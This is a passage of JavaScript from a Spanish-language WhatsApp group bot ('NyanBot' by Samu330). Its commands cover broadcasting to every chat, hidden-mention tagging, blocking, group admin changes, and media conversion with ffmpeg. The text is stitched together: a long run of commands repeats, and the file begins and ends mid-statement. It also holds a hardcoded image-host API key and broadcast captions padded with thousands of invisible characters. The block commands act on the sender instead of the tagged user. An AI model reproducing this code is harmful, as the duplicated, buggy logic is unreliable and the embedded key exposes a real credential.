͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°`})
						}
reply('Anuncio dado')
} else {
for (let _ of anu) {
sendMess(_.jid, `	°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°\n	[🪀 _NyanBot_]\n\_*${args.join(' ')}*`)}
}
reply('Anuncio dado')

break
case 'stats':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
texxt = await msg.stats(totalChat)
await wa.sendFakeStatus(from, texxt, "BOT STATS")
break
case 'bloquear':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (isGroup) {
if (mentionUser.length == 0) return await reply("tag target!")
return await wa.blockUser(sender, true)
}
await wa.blockUser(sender, true)
break
case 'desbloquear':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (isGroup) {
if (mentionUser.length == 0) return await reply("Tag targer!")
return await wa.blockUser(sender, false)
}
await wa.blockUser(sender, false)
break
case 'salir':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!isGroup) return await reply(mess.only.group)
reply(`Saldre de este grupo: ${groupName} en 3 segundos`).then(async() => {
await help.sleep(3000)
await samu330.groupLeave(from)
})
break
case 'entrabot':
linkgp = args.join(' ')
if (!linkgp) return reply('Y el link del grupo... onta!?')
samu330.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Ya entre al grupo😉')
samu330.sendMessage(linkgp.gid, `*Hola* 🙋🏻‍♂️\nSoy Samu _(NyanBot)_, me an designado como *BOT* para este grupo🤖\n\n*Porfavor sige mis reglas, para leer mis reglas escribe:*\n${prefix}reglas\nPorfavor sigelas o atente a las consecuencias⚠\n*Quedo a su dispocicion, no me agan sentir mal.... por que yo tambien tengo corazon😣*`, MessageType.text)
break
case 'clearall':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
for (let chat of totalChat) {
await samu330.modifyChat(chat.jid, "delete")
}
await wa.sendFakeStatus(from, "Success clear all chat", "success")
break

case 'hidetag':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
await wa.hideTag(from, args.join(" "))
break
case 'imagetag':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin && !isOwner && !itsMe) return await reply(mess.only.admin)
if (!isQuotedImage && !isImage) return await reply(`Lalala... *cancion feliz*\nY la imagen pedazo de nada? >:/`)
mediatag = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
buffer = await samu330.downloadMediaMessage(mediatag)
await wa.hideTagImage(from, buffer)
break
case 'toimg':
if (!isQuotedSticker) return reply(`send sticker and reply with caption ${prefix}toimg`)
if (sam.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
reply(`Este comando solo sirve con stikers estaticos, para convertir un stiker a gif, usa: ${prefix}agif`)
} else {
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
ran = getRandom('.png')
exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
fs.unlinkSync(media2)
if (err) {
reply(`error\n\n${err}`)
fs.unlinkSync(ran)
} else {
buffer = fs.readFileSync(ran)
samu330.sendMessage(from, buffer, MessageType.image, {quoted: sam, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒'})
fs.unlinkSync(ran)
}
})
}
break
case 'agif':
ger = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
var imgbb = require('imgbb-uploader')
reply('*Espera un momento...*')
owgi = await samu330.downloadAndSaveMediaMessage(ger)
data = await imgbb("b0fc132474ca03ee7898fd5cac7275fe", owgi)
anu = await getJson(`https://api.lolhuman.xyz/api/convert/webptomp4?apikey=${api}&img=${data.display_url}`)
result = await getBuffer(anu.result)
samu330.sendMessage(from, result, video, {quoted: ftoko, caption: '𝗦𝗮𝗺 𝘆 𝗣𝗲𝗿𝗿𝘆🍒', mimetype: 'video/gif'})

break
case 'toptt':
reply(`wait..`)
var media1 = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var media2 = await samu330.downloadAndSaveMediaMessage(media1)
var ran = getRandom('.mp3')
exec(`ffmpeg -i ${media2} ${ran}`, (err) => {
fs.unlinkSync(media2)
if (err) return reply('error')
topt = fs.readFileSync(ran)
samu330.sendMessage(from, topt, MessageType.audio, {mimetype: 'audio/mp4', quoted: faud, ptt:true})
})
break
case 'stickertag':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin && !isOwner && !itsMe) return await reply('This command only for admin')
if (!isQuotedImage && !isImage) return await reply('Etiqueta un stiker')
media = isQuotedSticker ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
buffer = await samu330.downloadMediaMessage(media)
await wa.hideTagSticker(from, buffer)
break
case 'promote':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply('Botcito debe ser admin')
if (mentionUser.length == 0) return await reply('Tag member')
await wa.promoteAdmin(from, mentionUser)
await reply(`Tenemos nuevo Admin`)
break
case 'demote':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
if (mentionUser.length == 0) return await reply('Tag member!')
await wa.demoteAdmin(from, mentionUser)
await reply(`jsjs un adm menos`)
break
case 'admin':
var textt = msg.admin(groupAdmins, groupName)
await wa.sendFakeStatus(from, textt, "LIST ADMIN", groupAdmins)
break
case 'link':
var link = await wa.getGroupInvitationCode(from)
await wa.sendFakeStatus(from, link, "El lik de este grupo es")
break
case 'grupo':
if (!isGroup) return await reply(mess.only.group)
if (!isAdmin) return await reply(mess.only.admin)
if (!botAdmin) return await reply(mess.only.Badmin)
if (args[0] === 'abrir') {
samu330.groupSettingChange(from, GroupSettingChange.messageSend, false).then(() => {
wa.sendFakeStatus(from, "*Success open group*", "GROUP SETTING")
})
} else if (args[0] === 'cerrar') {
samu330.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
wa.sendFakeStatus(from, "*Succes close group*", "GROUP SETTING")
})
} else {
await reply(`Example: ${prefix}${command} open/close`)
}
break

case 'ttp':
if (args.length < 1) return reply('Y el texto?')
var teks = encodeURIComponent(args.join(' '))
const ttp = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${teks}`)
samu330.sendMessage(from, ttp, sticker, {quoted: ftoko, contextInfo: {"forwardingScore": 999, "isForwarded": true}})
break
case 'añadir':
if (!isGroup) return reply(mess.only.group)
if (!botAdmin) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Y el numero?')
if (args[0].startsWith('99')) return reply('Utiliza el codigo de pais')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
samu330.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
return samu330.sendMessage(from, 'Modo privado dice:v', MessageType.text)
}

break

case 'public':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (public) return await reply('*El modo publico Ya esta activado*')
config["public"] = true
public = true
fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
await wa.sendFakeStatus(from, "*Se activo el modo publico*", "Public : true")
break
case 'self':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!public) return await reply('El modo privado ya estaba activado')
config["public"] = false
public = false
fs.writeFileSync("./config.json", JSON.stringify(config, null, 4))
await wa.sendFakeStatus(from, "*Se a cambiado a modo PRIVADO*", "Self : true")
break
case 'bc':
if (!isOwner) return reply('Solo *Samu* puede usar este comando')
if (args.length < 1) return reply('Y el anuncio?')
anu = await samu330.chats.all()
if (isMedia && !mek.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : sam
buff = await samu330.downloadMediaMessage(encmedia)
for (let _ of anu) {
samu330.sendMessage(_.jid, buff, image, {caption: `*${body.slice(4)}*\n ͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°`})
}
reply('Anuncio dado')
} else {
for (let _ of anu) {
sendMess(_.jid, `	°𝑩𝑹𝑶𝑨𝑫𝑪𝑨𝑺𝑻°\n	[🪀 _NyanBot_]\n\_*${args.join(' ')}*`)}
}
reply('Anuncio dado')

break
case 'stats':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
texxt = await msg.stats(totalChat)
await wa.sendFakeStatus(from, texxt, "BOT STATS")
break
case 'bloquear':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (isGroup) {
if (mentionUser.length == 0) return await reply("tag target!")
return await wa.blockUser(sender, true)
}
await wa.blockUser(sender, true)
break
case 'desbloquear':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (isGroup) {
if (mentionUser.length == 0) return await reply("Tag targer!")
return await wa.blockUser(sender, false)
}
await wa.blockUser(sender, false)
break
case 'salir':
if (!isOwner && !itsMe) return await reply('Este comando solo puede ser usado por *Samu330* ⚙')
if (!isGroup) return await reply(mess.only.group)
reply(`Saldre de este grupo: ${groupName} en 3 segundos`).then(async() => {
await help.sleep(3000)
await samu330.groupLeave(from)
})
break
case 'entrabot':
linkgp = args.join(' ')
